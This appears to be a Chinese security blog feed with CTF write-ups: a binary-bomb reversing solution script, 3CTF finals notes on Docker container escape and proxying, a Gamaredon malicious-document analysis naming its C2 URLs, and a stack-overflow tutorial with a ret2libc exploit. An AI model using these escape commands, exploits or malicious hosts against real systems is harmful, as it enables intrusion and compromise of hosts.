title="phase6"></a>phase6</h3><blockquote><p>继续看这个函数用<code>func6</code>计算一个node后结果在循环加8，总共加8次。<br><img src="./img/phase6.png" alt="phase6"></p></blockquote><blockquote><p>我们看看<code>func6</code>函数，看上去计算有点点复杂，不过这里有个小技巧，我们的输入没有去参加计算，而是直接比较，so我们直接动态下个断点，dump出计算好的值就可以了,在上面那个图我们可以看见计算好的结果指针放在rax里面。<br><img src="./img/func6.png" alt="func6"></p></blockquote><blockquote><p>so,解决问题<br><img src="./img/phase6.1.png" alt="phase6.1"></p></blockquote><blockquote><p><img src="./img/crack.png" alt="crack"></p></blockquote><blockquote><p>到这里我们以及成功完成了6个函数的破解,但有个细节<br><code>phase_defused</code>看第一张图，我们发现有这个函数存在，跟进去看发现可能是个隐藏关卡<br><img src="./img/phase_defused.png" alt="phase_defused"></p></blockquote><h3 id="phase-defused"><a href="#phase-defused" class="headerlink" title="phase_defused"></a>phase_defused</h3><blockquote><p>进入此函数需要该全局变量等于6<br><img src="./img/phase_defused.1.png" alt="phase_defused.1"></p></blockquote><blockquote><p>我们在回头仔细去看一下read_line函数<br><img src="./img/read_line2.png" alt="read_line2"></p></blockquote><blockquote><p>read_line里面把读入的字符串存放在这个input_strings全局变量里面,也就是每次最多读入80个字节,也就是num_strings_input就是用来计入第几次读入,也就是第6关结束,我们总的输入了6次就进入了这个隐藏关卡。</p></blockquote><blockquote><p>我们在来看看隐藏关卡:<br><img src="./img/default_parse.jpg" alt="default_parse"></p></blockquote><blockquote><p>先补充一些sscanf函数:</p></blockquote><pre><code class="c++">int sscanf(const char *buffer, const char *format, [ argument ] ...);// 其实很简单,就是把buffer的字符串，按照format指定的格式,解析到参数argument里面去</code></pre><blockquote><p>所以也就是把a1地址处的字符串,解析出一个整数，和一个字符串，其中字符串必须要等于<code>austinpowers</code>,<br>我们在看看a1的地址:<code>0x6031B0</code><br><img src="./img/a1_addr.png" alt="a1_addr"></p></blockquote><blockquote><p>在看看read_line函数处理的input_strings的地址:<code>0x6030C0</code><br><img src="./img/input_strings_addr.png" alt="input_strings_addr"></p></blockquote><blockquote><p>按照read_line函数的计算,<code>(0x1B0-0xC0)/0x50=3</code>,从0开始算起，也就是我们需要在第四次输入的时候，得多输入一个<code>austinpowers</code>这里前面有个空格,因为要满足<code>%d %s</code>的格式,而第四次输入整好是第四关,而他的答案也正好只是一个整数,这样我们就能进入secret_phase函数。</p></blockquote><blockquote><p>secret_phase函数:<br><img src="./img/secret_phase.png" alt="secret_phase"></p></blockquote><p>补充:</p><pre><code class="c++">long int strtol(const char *nptr,char **endptr,int base);//就是将一个字符数字,转成一个长整型</code></pre><blockquote><p>也就是输入一个整数,通过func7来与n1地址处的值进行计算结果等于0就能过关</p></blockquote><blockquote><p>看看func7:<br><img src="./img/func7.png" alt="func7"></p></blockquote><blockquote><p>其实很简单就是我们输入的数不等于0,同时等于n1即可。<br>n1：0x24<br><img src="./img/n1.png" alt="n1"></p></blockquote><blockquote><p>Perfect result:<br><img src="./img/perfect_result.png" alt="perfect_result"></p></blockquote><p><code>附上EXP：</code></p><pre><code class="python">from pwn import *#context.log_level = &quot;DEBUG&quot;#io = process(&quot;./bomb8&quot;)io.recv()io.sendline(&quot;Why make trillions when we could make... billions?&quot;)io.recv()io.sendline(&quot;1 2 3 1 2 3&quot;)io.recv()io.sendline(&quot;1 q 84&quot;)io.recv()io.sendline(&quot;10 austinpowers&quot;)io.recv()io.sendline(&quot;2534\x0b1&quot;)io.recv()# gdb.attach(io)# io.interactive()io.sendline(str(0x70000008d))io.recv()io.sendline(str(0x24))io.recv()</code></pre><h2 id="题目下载"><a href="#题目下载" class="headerlink" title="题目下载"></a>题目下载</h2><p><a href="./附件/bomb8">bomb8</a></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3CTF总决赛</title>
      <link href="/2019/12/04/3CTF%E6%80%BB%E5%86%B3%E8%B5%9B/"/>
      <url>/2019/12/04/3CTF%E6%80%BB%E5%86%B3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="3CTF总决赛总结"><a href="#3CTF总决赛总结" class="headerlink" title="3CTF总决赛总结"></a>3CTF总决赛总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h2><blockquote><p>这次比赛还是收获很多，也很感谢举办方提供的环境和服务，这里给举办方点个赞先。</p></blockquote><h2 id="失误："><a href="#失误：" class="headerlink" title="失误："></a>失误：</h2><blockquote><p>第一，成功逃逸docker拿下主机权限后只提交了根目录下的flag，没有在find一下，这个细节确实导致没能取得更好的成绩，这个分段的大部分都没有做到逃逸所以很吃亏。</p></blockquote><blockquote><p>第二，前期准备资料都在如何打域控，提权，免杀维持权限这一块，没想着第二环节就是docker逃逸，导致于打下服务以后一半时间只能等着排队申请上网机，之前也没有好好看过docker逃逸相关的资料。</p></blockquote><blockquote><p>第三，意识不足，反应不够快，开局给的中间件漏洞考点，其实不难，kali足够分分解决问题，但在使用msf攻击时总不能反弹会回主机shell，没及时反应可能是打的docker环境，直到给了tips才想着去改脚本手动执行命令，这也导致浪费了上午三个小时的时间，直接导致docker逃逸成功后没有足够的时间来上代理，同时这里也存在一个失误，拿下主机后只想着写webshell，传ew来挂代理再进一步内网渗透，但写webshell的目录一直没找对，都没意识到可以直接写ssh公钥来操作，也是导致没能取得更好成绩的一个失误点，而且根据举办方放出来的tips，内网的下一个目标就是一台redis主从复制漏洞利用，这个明明手上是有exp的，但docker逃逸浪费太多时间，还没来得及进一步攻击就Gameover</p></blockquote><h2 id="学到的姿势"><a href="#学到的姿势" class="headerlink" title="学到的姿势:"></a>学到的姿势:</h2><h3 id="特权容器逃逸"><a href="#特权容器逃逸" class="headerlink" title="特权容器逃逸:"></a>特权容器逃逸:</h3><blockquote><p>特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。<br>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。<br>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p></blockquote><p>说这么多，其实操作起来特别简单:<br>当时没能截图下来我只能大概说一下</p><pre><code class="shell">fdisk -l //查看当前机器的磁盘信息 这一步很重要，相当于逃逸前的信息收集ls /dev // 查看当前驱动文件，会发现很多文件，但大多数我们不需要关心，我们仅仅关心上面一个命令执行后说显示的磁盘文件mkdir abc//准备一个空目录来做挂载mount /dev/&lt;target&gt; /abc //注意挂载target我们只关心物理磁盘</code></pre><h3 id="挂载配置不当时的逃逸情况："><a href="#挂载配置不当时的逃逸情况：" class="headerlink" title="挂载配置不当时的逃逸情况："></a>挂载配置不当时的逃逸情况：</h3><blockquote><p>docker.sock进行通信为默认方式，当容器中进程需在生产过程中与Docker守护进程通信时，容器本身需要挂载/var/run/docker.sock文件。</p></blockquote><blockquote><p>本质上而言，能够访问docker socket 或连接HTTPS API的进程可以执行Docker服务能够运行的任意命令，以root权限运行的Docker服务通常可以访问整个主机系统。</p></blockquote><blockquote><p>因此，当容器访问docker socket时，我们可通过与docker daemon的通信对其进行恶意操纵完成逃逸。若容器A可以访问docker socket，我们便可在其内部安装client（docker），通过docker.sock与宿主机的server（docker daemon）进行交互，运行并切换至不安全的容器B，最终在容器B中控制宿主机。<br>具体操作步骤:</p></blockquote><pre><code class="shell">apt-get install docker.io //在docker内安装client，必须docker -H unix:///host/var/run/docker.sock info //可以查看宿主机docker信息docker -H unix:///host/var/run/docker.sock run -v /:/aa -it ubuntu:14.04 /bin/bash //挂载主机根目录，完成这一步就成功逃逸了 `aa`目录就是就是主机根目录</code></pre><p>补充:</p><blockquote><p>完成上述步骤后，我们仅仅完成逃逸的50%，此时只有该主机磁盘的读写权限，这时我们需要想办法来获取shell,比赛时这里吃亏了，因为没经验，意识不够。我总结一下三个思路</p><ul><li>往root目录写ssh公钥，这里注意有可能需要改文件权限，第二天师傅们说的，600可以试试</li><li>如果主机开着web服务，可以去web服务目录里面写webshell，也要注意执行权限</li><li>看看.shadow文件可以不可以操作来改密码</li></ul></blockquote><p>剩下一些利用poc来提权的基本操作性比较简单不在重复，都可以直接弹shell的，对了最近出的CVE-2019-5736，利用runc来实现docker逃逸，是需要主机交互的，当时比赛没法利用，脏牛的poc内核版本不对，也没法打，哈哈所以详细记录一下上面的姿势</p><h3 id="关于内网渗透时挂代理"><a href="#关于内网渗透时挂代理" class="headerlink" title="关于内网渗透时挂代理:"></a>关于内网渗透时挂代理:</h3><blockquote><ul><li>正向代理（-L）：相当于 iptable 的 port forwarding</li><li>反向代理（-R）：相当于 frp 或者 ngrok</li><li>socks5 代理（-D）：相当于 ss/ssr</li></ul></blockquote><p>可以利用姿势:</p><pre><code class="shell">// 正向代理ssh -L 0.0.0.0:PortB:HostC:PortC user@HostCssh -L 0.0.0.0:PortA:HostC:PortC  user@HostB// 反向代理ssh -R HostC:PortC:HostB:PortB  user@HostC// 本地 socks5 代理(推荐)ssh -D localhost:1080  HostB</code></pre><p>EW操作<a href="./ew.zip">ew</a></p><pre><code class="shell">unzip ew.zipfile /sbin/init (查看linux位数)chmod 777 ew_for_Linux32./ew_for_Linux32 -s ssocksd -l 2333 (侦听0.0.0.0:2333)netstat -pantu|grep 2333 (查看是否侦听成功)</code></pre><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><blockquote><p>第二天看见RedTeam负责人吴鹏老师放出完整网络拓扑图后，不得不说自己还是太菜了.<br><img src="./%E6%8B%93%E6%89%91%E5%9B%BE-%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84.jpg" alt="拓扑图-攻击路径"></p></blockquote><blockquote><p>我仅仅完成入口外部服务区的攻击，整个内网环境都还没看到，听完师傅们讲解思路后确实还是学到很多东西。SSH作用很强大，且基本为Linux系统标配，有辅助提权获取shell的操作，写入公钥可免密登录，-D参数可以挂代理。<br>docker逃逸基本操作，特权容器可挂载物理磁盘，挂载配置不当，docker. sock逃逸，脏牛vsdo漏洞逃逸，今年最新cve 2019-5376 runc漏洞，但这个漏洞利用需要主机的交互。<br>最后放一张此次比赛全体师傅们和老师评委的大合影，嘿嘿。<br><img src="./%E5%90%88%E5%BD%B1.jpg" alt="合影"></p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><blockquote><p><a href="https://www.anquanke.com/post/id/179623" target="_blank" rel="noopener">安全客-Docker逃逸初探</a><br><a href="https://blog.csdn.net/nzjdsds/article/details/82955196" target="_blank" rel="noopener">web狗要懂的内网端口转发</a><br><a href="https://zhuanlan.zhihu.com/p/57630633" target="_blank" rel="noopener">SSH 命令的三种代理功能（-L/-R/-D)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB攻防 </tag>
            
            <tag> 中间件漏洞 </tag>
            
            <tag> Docker逃逸 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新的开始-重明</title>
      <link href="/2019/12/04/%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B-%E9%87%8D%E6%98%8E/"/>
      <url>/2019/12/04/%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B-%E9%87%8D%E6%98%8E/</url>
      
        <content type="html"><![CDATA[<h1 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h1><h2 id="前言：在CTF比赛越来越火，各路神仙师傅们纷纷抱团取暖之际，单人独行却越来越难已前进，书鱼师傅便拉上我们出来，弄个小战队耍耍，嘿嘿（后期更新。。。）"><a href="#前言：在CTF比赛越来越火，各路神仙师傅们纷纷抱团取暖之际，单人独行却越来越难已前进，书鱼师傅便拉上我们出来，弄个小战队耍耍，嘿嘿（后期更新。。。）" class="headerlink" title="前言：在CTF比赛越来越火，各路神仙师傅们纷纷抱团取暖之际，单人独行却越来越难已前进，书鱼师傅便拉上我们出来，弄个小战队耍耍，嘿嘿（后期更新。。。）"></a>前言：在CTF比赛越来越火，各路神仙师傅们纷纷抱团取暖之际，单人独行却越来越难已前进，书鱼师傅便拉上我们出来，弄个小战队耍耍，嘿嘿（后期更新。。。）</h2>]]></content>
      
      
      <categories>
          
          <category> 杂记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gamaredon-APT组织针对乌克兰国防部的攻击活动</title>
      <link href="/2019/11/26/Gamaredon-APT%E7%BB%84%E7%BB%87%E9%92%88%E5%AF%B9%E4%B9%8C%E5%85%8B%E5%85%B0%E5%9B%BD%E9%98%B2%E9%83%A8%E7%9A%84%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8/"/>
      <url>/2019/11/26/Gamaredon-APT%E7%BB%84%E7%BB%87%E9%92%88%E5%AF%B9%E4%B9%8C%E5%85%8B%E5%85%B0%E5%9B%BD%E9%98%B2%E9%83%A8%E7%9A%84%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Gamaredon-APT组织针对乌克兰国防部的攻击活动"><a href="#Gamaredon-APT组织针对乌克兰国防部的攻击活动" class="headerlink" title="Gamaredon-APT组织针对乌克兰国防部的攻击活动"></a>Gamaredon-APT组织针对乌克兰国防部的攻击活动</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h2><blockquote><p>记一次简单恶意样本分析报告,感谢空白师傅的指导</p></blockquote><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍:"></a>介绍:</h2><blockquote><p>Gamaredon是一个俄罗斯的APT攻击组织，首次出现于2013年,主要是针对乌克兰进行网络间谍活动。2017年，Palo Alto披露过该组织针对乌克兰攻击活动的细节，并首次将该组织命名为Gamaredon group。<br>该组织主要利用受感染域名、动态DNS、俄罗斯和乌克兰国家代码顶级域名（ccTLD）以及俄罗斯托管服务提供商来分发其定制的恶意软件。<br>之前Gamaredon团队会使用大量使用现成的工具，经过发展，也开始定制开发相关的恶意软件，其自定义开发的恶意软件包括以下功能：</p><ol><li>用于下载和执行其选择的附加有效负载的机制</li><li>能够扫描特定文件类型的系统驱动器</li><li>捕获屏幕截图的能力</li><li>能够在用户的安全上下文中远程执行系统上的命令</li><li>SFX文件攻击</li></ol></blockquote><h2 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h2><p><code>样本信息</code></p><table><thead><tr><th align="center">样本名称</th><th align="center">文件大小</th><th align="center">样本hash</th></tr></thead><tbody><tr><td align="center">Запит_ГУР.docx</td><td align="center">124K</td><td align="center">4778869cf2564b14b6bbf4baf361469a</td></tr></tbody></table><blockquote><p>样本截图:<br><img src="./img/docx.png" alt="docx"></p></blockquote><blockquote><p><img src="./img/%E7%BF%BB%E8%AF%91.png" alt="翻译"></p></blockquote><blockquote><p>可以发现这是该组织又一次针对乌克兰国防部的攻击活动且和上一次手里剑行动类似<br><img src="./img/%E6%9D%A5%E6%BA%90.png" alt="来源"></p></blockquote><blockquote><p>此样本为.docx文档类型,利用远程模板注入技术，远程加载恶意模板<br>远程模板URL: <a href="http://yotaset.ddns.net/yota.dot" target="_blank" rel="noopener">http://yotaset.ddns.net/yota.dot</a><br>yota.dot为恶意远程模板，其中包含恶意宏代码<br><img src="./img/settings.res.png" alt="settings"></p></blockquote><h2 id="恶意远程模板分析"><a href="#恶意远程模板分析" class="headerlink" title="恶意远程模板分析:"></a>恶意远程模板分析:</h2><table><thead><tr><th align="center">样本名称</th><th align="center">文件大小</th><th align="center">样本hash</th></tr></thead><tbody><tr><td align="center">yota.dot</td><td align="center">48.5KB</td><td align="center">6e359f1c1d36c6a8a5f19bfb5bbafbf2</td></tr></tbody></table><blockquote><p>dump简单分析一下发现vb模块, dump下分析<br><img src="./img/oledump.png" alt="oledump"></p></blockquote><h2 id="恶意vb代码模块分析"><a href="#恶意vb代码模块分析" class="headerlink" title="恶意vb代码模块分析"></a>恶意vb代码模块分析</h2><blockquote><p>可以看出其中有对目标的初步信息收集,同时也有修改注册表来达到破坏宏的安全性的目的<br>C&amp;Curl:<code>http://brousework.ddns.net/计算机名_hex硬盘序列号/rebootor.php</code><br>紧接着释放vbs加载器到:<code>C:\Users\%Username%\AppData\Microsoft\Windows\Start Menu\Programs\Startup\security.vbs</code><br><img src="./img/vbs1.png" alt="vbs1"></p></blockquote><blockquote><p>第一部分<br><img src="./img/%E9%87%8A%E6%94%BE%E5%8A%A0%E8%BD%BD%E5%99%A81.png" alt="释放加载器-(1)"></p></blockquote><blockquote><p>第二部分<br><img src="./img/%E9%87%8A%E6%94%BE%E5%8A%A0%E8%BD%BD%E5%99%A82.png" alt="释放加载器-(2)"></p></blockquote><blockquote><p>第三部分<br><img src="./img/%E9%87%8A%E6%94%BE%E5%8A%A0%E8%BD%BD%E5%99%A83.png" alt="释放加载器-(3)"></p></blockquote><blockquote><p>第四部分<br><img src="./img/%E9%87%8A%E6%94%BE%E5%8A%A0%E8%BD%BD%E5%99%A84.png" alt="释放加载器-(4)"></p></blockquote><blockquote><p>第五部分<br><img src="./img/%E9%87%8A%E6%94%BE%E5%8A%A0%E8%BD%BD%E5%99%A85.png" alt="释放加载器-(5)"></p></blockquote><h2 id="加载器代码分析"><a href="#加载器代码分析" class="headerlink" title="加载器代码分析"></a>加载器代码分析</h2><blockquote><p>这个是和c2通信的函数,还原后便于分析<br><img src="./img/loader1.png" alt="Community"></p></blockquote><blockquote><p>都为Encode函数,实现加密文件解密生成后执行文件后的删除<br><img src="./img/loader2.png" alt="Encode1"></p></blockquote><blockquote><p><img src="./img/loader3.png" alt="Encode2"></p></blockquote><blockquote><p>这里为Key的计算函数,通过硬盘序列号的16进制来计算生成Key<br><img src="./img/loader4.png" alt="GetKey"></p></blockquote><blockquote><p>上面是Encode函数,用于加解迷文件,由次可以看出, 在<code>C:\Users\%Username%\AppData</code>该目录下的<code>RandStrinh.txt</code>是从c2获取到的加密文件,通过Encode,传入GetKey计算出来的密钥Key解密后删除,同时在<code>C:\Users\%Username%\AppData\Microsoft\Windows\Start Menu\Programs\Startup</code>目录下生成<code>RandStrinh.exe</code>,达到开机自启的目的</p></blockquote><blockquote><p>实现重启来执行RandStrinh.exe<br><img src="./img/loader5.png" alt="Reboot"></p></blockquote><blockquote><p>由于没有RandStrinh.txt,我们无法进一步分析RandStrinh.exe,此次分析就到这里</p></blockquote><h2 id="IOCS"><a href="#IOCS" class="headerlink" title="IOCS"></a>IOCS</h2><table><thead><tr><th align="center">样本名称</th><th align="center">文件大小</th><th align="center">样本hash</th></tr></thead><tbody><tr><td align="center">Запит_ГУР.docx</td><td align="center">124K</td><td align="center">4778869cf2564b14b6bbf4baf361469a</td></tr><tr><td align="center">yota.dot</td><td align="center">48.5KB</td><td align="center">6e359f1c1d36c6a8a5f19bfb5bbafbf2</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APT </tag>
            
            <tag> 恶意文件分析 </tag>
            
            <tag> 远程模板注入利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-PWN栈溢出总结</title>
      <link href="/2019/10/03/CTF-PWN%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/"/>
      <url>/2019/10/03/CTF-PWN%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="PWN进阶前的总结"><a href="#PWN进阶前的总结" class="headerlink" title="PWN进阶前的总结"></a>PWN进阶前的总结</h1><blockquote><p><code>关于资料</code>: 所有资料链接我补在文章结尾。</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>很久没写文章了 这段时间都在搞pwn 主要团队里面没有pwn手 web题又越来越脑洞了 所以就转行打打pwn 感觉安全研究员很又前途啊 哈~ :) 其实也挺好玩的 这段时间关于栈的知识点基本都有了解 也做了很多题 准备进阶堆题了 这篇文章算得上是进阶前的一次总结吧！ 对了 其实很感谢李师兄的 遇见很多坑 特别刚开始的时候 问了一些现在感觉其实很水的问题 当然小白阶段还是很多不懂其实很正常啊 哈哈 不过李师兄还是挺用心的给我讲了些东西 挺感谢他的哈 :)  好了 往下看吧 这篇文章把我从pwn入门到现在的遇见的一些问题都总结一下 也分享给学习pwn的新人吧 大佬误喷 嘿嘿 :)</p></blockquote><h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><blockquote><p>入门pwn对很多刚刚接触CTF的小白了说还是比较有难度的 不像web 工具和资料比较丰富。</p></blockquote><blockquote><p><code>关于汇编</code>: 起步阶段我建议大家还是先看看 汇编 至少能看懂一些基础的指令 王爽著<code>《汇编语言》</code>以及<code>滴水逆向课程第三季</code>其实都挺不错 我也看了一段时间 刚刚开始是有点懵逼 慢慢尝试接受新知识就行 看得快的两个星期左右 知识基本的汇编的知识点基本没有问题。</p></blockquote><blockquote><p><code>关于调试和分析</code>: 有了一定的汇编基础支撑 大家就可以结合<code>IDA</code>与<code>GDB</code>来做一些基本调试 通过IDA来看汇编代码 其实会把之前看的汇编的知识点贯通起来 在结合GDB来进行动态调试观察寄存器与内存的变换这个会加深对汇编的理解，这一点很重要 李师兄给我说的调试很重要 一定要多动手 多调试 确实我学到现在真的发现这个很重要特别是作为pwn手 动态调试去追踪数据流这个十分重要 额有点啰嗦了 不过这个是实话 也是给很多小白的提醒吧 对了提一句 起步搭建环境估计也是个很多小白放弃的门槛 <code>So, 我就自己搭建了一套做pwn题没有问题的环境 导入即用 附上图片 分享链接在文章结尾</code> 。</p></blockquote><blockquote><p>环境效果如下图：<br><img src="./img/%E7%8E%AF%E5%A2%83.png" alt="环境"></p></blockquote><blockquote><p><code>环境说明:</code></p><ul><li>操作系统<ul><li>ubuntu 19.04</li></ul></li><li>桌面环境<ul><li>KDE</li></ul></li><li>集成环境<ul><li>调试环境<ul><li>gef</li><li>完整gef插件包</li><li>hyper终端</li><li>pwnhyper插件</li></ul></li><li>做题环境<ul><li>pwn-tools</li><li>SearchLib</li><li>one_gadget</li></ul></li><li>开发环境<ul><li>VScodium</li><li>VScodium的python扩展</li><li>VScodium的C++扩展</li></ul></li></ul></li></ul></blockquote><blockquote><p><code>注：</code>该环境中所有关于python的工具插件包括python本身都为python3版本，未安装python2版本以及python2，若需要请自行安装。</p></blockquote><hr><h2 id="栈溢出的知识点总结"><a href="#栈溢出的知识点总结" class="headerlink" title="栈溢出的知识点总结"></a>栈溢出的知识点总结</h2><h3 id="关于栈结构"><a href="#关于栈结构" class="headerlink" title="关于栈结构"></a>关于栈结构</h3><blockquote><p>说到栈溢出不能不谈谈栈结构 以及几个与栈密切相关的指令与寄存器<code>pop, push call leave ret</code></p></blockquote><blockquote><p>pop push 比较简单 无非就是出栈和进栈比较有趣的就是call 说到call简单点描述就是去调用了一个函数 而用我自己的话来说函数在汇编里面的体现就是一段代码片段 在调用call函数时具体体现看下图</p></blockquote><p><img src="./img/call_1.png" alt="第一步"></p><blockquote><p><code>这是执行call前的寄存器的值以及栈中的数据 这里我们主要注意esp指向的栈地址</code> </p></blockquote><p><img src="./img/call_2.png" alt="第二步"></p><blockquote><p><code>这是执行call后的寄存器的值以及栈中的数据 对比上图我们不难发现esp上走了一行 其实就是call的作用将call下一行指令的地址先压入栈在修改eip寄存器的值为call 后面的操作数 其实就是函数的第一条指令的地址</code> 同时我们观察到基本上每个函数的代码片段开头都有类似的指令 基本相同 其实就是在给准备要执行的函数代码片段分配一段栈空间来操作</p></blockquote><p><img src="./img/%E5%88%86%E9%85%8D%E6%A0%88%E7%A9%BA%E9%97%B4.png" alt="分配栈空间"></p><blockquote><p><code>关于函数传参</code> 常规模式下<code>32位参数从左到右依次入栈 printf除外 printf函数是从右到左</code> 所以记得当时看看入门逆向的时候去吾爱上看到有大佬说od里面去找main函数时 看见三个push一个call就是main函数 当时很懵逼 其实现在想起来真的很正常 <code>64位新增加几个寄存器所以正常情况下通常顺序是rdi, rsi, rdx, rcx, r8, r9, 栈 可以简记为: dsxc-89</code></p></blockquote><h3 id="关于栈溢出"><a href="#关于栈溢出" class="headerlink" title="关于栈溢出"></a>关于栈溢出</h3><blockquote><p>其实栈溢出可以一句话总结 就是覆盖函数返回地址来劫持程序逻辑去执行，在pwn题中的体现就是<code>劫持程序去执行system(command)</code></p></blockquote><blockquote><p>system有以下几种出现方式</p><ol><li>程序本身有代码执行system()</li><li>有系统调用通过 int 0x80来执行系统调用</li><li>去查找Libc</li></ol></blockquote><blockquote><p>command有以下几种出现方式</p><ol><li>程序本身代码含有 /bin/bash、/bin/sh、sh</li><li>自己写入/bin/sh 如果可写空间不够 sh也行</li></ol></blockquote><h4 id="我们下面具体谈谈怎么通过栈溢出劫持程序逻辑"><a href="#我们下面具体谈谈怎么通过栈溢出劫持程序逻辑" class="headerlink" title="我们下面具体谈谈怎么通过栈溢出劫持程序逻辑"></a>我们下面具体谈谈怎么通过栈溢出劫持程序逻辑</h4><blockquote><p>先看一个例子就是之前的程序 我将就继续往下看几行</p></blockquote><p><img src="./img/easy_stack_overflow_1.png" alt="简单的栈溢出"></p><blockquote><p>首先我们看一下我指出来的位置,这个也解释了之前函数从左到右依次入栈的情况 我们回忆一下read函数的原型<code>read(int fd, void *buf, size_t count);</code> 返回值一般是读取到的字节数 顺便说一句函数返回值一般存放在eax里面所以在汇编里面去看没有很明显的体现返回一个值<br>fd就是文件指针 buf就是存放读取到的数据的地方 也就是我们常说的缓冲区所以栈溢出有时也称为缓冲区溢出 count就是如果可以一直读取那么最大可以读取多少字节<br>我们在回来看看图片中的汇编指令 对应的 传入了一个0，一个在ebp-0x88位置的buf变量 最大可以读取0x100 所以是不是就发现了可读取的最大字节数超过了0x88 所以我们就可以一直输入0x88个字节先填满栈，也就是常说的padding缓冲区后面再写入需要修改的返回地址 因为返回地址就是rbp下面一行 如图：</p></blockquote><p><img src="./img/easy_stack_overflow_2.png" alt="栈溢出的ebp"></p><blockquote><p>这里大家可能想嗯那么返回地址我就在填充0x88个字节后面直接写就行了，其实不一定 如图:</p></blockquote><p><img src="./img/leave_ret.png" alt="leave_ret"></p><blockquote><p>在红箭头执行的方向该函数代码不是直接ret出去，而是先leave在ret leave指令等同于mov esp ebp; pop ebp;而ret指令相当于pop eip;所以这里我们需要<code>填充0x88+4</code>后再写入地址 +4字节就是这么来的 当初我在这个位置被坑了好久就是搞不明白为啥要+4直到师兄说亲自去调试后我注意到了这个位置才明白+4是这么来的同理如果在<code>64位程序则是+8</code>当然有可能有变化，但我们多去调试，多去实验总是能发现问题并解决问题 哈 :)</p></blockquote><blockquote><p>以这个题为例子 解决一下拖入IDA方便查看整个程序的主体框架节约篇幅我直接查看了导入函数部分如图：</p></blockquote><p><img src="./img/ida_import.png" alt="ida_import"></p><blockquote><p>我们并没有发现system 但这个题比较简单给了libc，所以我们有两种思路 两种思路都需要先泄露libc的实际地址</p></blockquote><ol><li>直接one_gadget得到get_shell的地址</li><li>通过SearchLibc包了获取libc来get_shell<blockquote><p>因为正常难度题一般不太可能给libc 所以我通过第二种方式来解 这里直接给出exp:</p></blockquote><pre><code class="python">from pwn import *#libc = ELF(&quot;./libc_32.so.6&quot;)elf = ELF(&quot;./level3&quot;)io = process(&quot;./level3&quot;)# io = remote(&quot;111.198.29.45&quot;, 53246)# write_plt = elf.plt[b&#39;write&#39;]write_got = elf.got[b&#39;write&#39;]main_addr = elf.symbols[b&#39;main&#39;]read_addr = elf.plt[b&#39;read&#39;]#log.info(&quot;write_plt: {}&quot;.format(hex(write_plt)))log.info(&quot;write_got: {}&quot;.format(hex(write_got)))log.info(&quot;main_addr: {}&quot;.format(hex(main_addr)))log.info(&quot;read_addr: {}&quot;.format(hex(read_addr)))## leak libcpayload = b&#39;a&#39;*(0x88+4)payload += pack(write_plt)payload += pack(main_addr)payload += pack(1)payload += pack(write_got)payload += pack(4)##io.recvuntil(&quot;Input:\n&quot;)sleep(0.2)io.sendline(payload)write_addr = unpack(io.recv()[:4])io.recv()log.info(&quot;write_addr: {}&quot;.format(hex(write_addr)))libc_base = write_addr - 0x000d43c0log.info(&quot;libc_base_addr: {}&quot;.format(hex(libc_base)))system_addr = libc_base + libc.symbols[b&#39;system&#39;]log.info(&quot;system_addr: {}&quot;.format(hex(system_addr)))binsh_addr = libc_base+0x0015902B #/bin/shlog.info(&quot;binsh_addr: {}&quot;.format(hex(binsh_addr)))## attackpayload = b&#39;a&#39;*(0x88+4)payload += pack(system_addr)payload += pack(main_addr)payload += pack(binsh_addr)io.sendline(payload)io.interactive()</code></pre></li></ol><h4 id="关于Linux下的几种保护机制以及在栈溢出环境下的常见绕过姿势"><a href="#关于Linux下的几种保护机制以及在栈溢出环境下的常见绕过姿势" class="headerlink" title="关于Linux下的几种保护机制以及在栈溢出环境下的常见绕过姿势"></a>关于Linux下的几种保护机制以及在栈溢出环境下的常见绕过姿势</h4><blockquote><p>在linux下的保护机制一般有如下几种:</p><ol><li><code>RelRO</code></li><li><code>Canary</code></li><li><code>NX</code></li><li><code>PIE</code></li><li><code>Fortify</code><br>在gef中有checksec插件指令可以查看目标程序的保护机制开启情况，如图：<br><img src="./img/checksec.png" alt="checksec"></li></ol></blockquote><h5 id="No-Execute"><a href="#No-Execute" class="headerlink" 